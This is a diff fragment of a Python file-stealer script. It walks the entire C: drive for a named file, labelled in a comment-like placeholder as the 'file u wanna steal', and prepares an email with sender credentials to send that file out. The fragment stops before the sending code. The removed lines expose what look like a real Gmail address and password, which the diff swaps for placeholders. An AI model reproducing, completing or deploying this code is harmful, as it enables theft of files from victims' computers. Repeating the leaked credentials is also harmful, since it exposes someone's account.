@@ -9,14 +9,14 @@ from email import encoders
 def fsf():
     for root, dirs, files in os.walk('C:\\'):
         for file in files:
-            if file.endswith('dakdak.txt'):
+            if file.endswith('file u wanna steal'):
                 pis = os.path.join(root, file)
                 if pis == os.path.join(root, file):
                     pass
                 
-                email_user = 'howtohax3free@gmail.com'
-                email_password = 'sambath123'
-                email_send = 'howtohax3free@gmail.com'
+                email_user = 'ur email'
+                email_password = 'ur pass'
+                email_send = 'ur email'
                 subject = 'subject'
 
                 msg = MIMEMultipart()
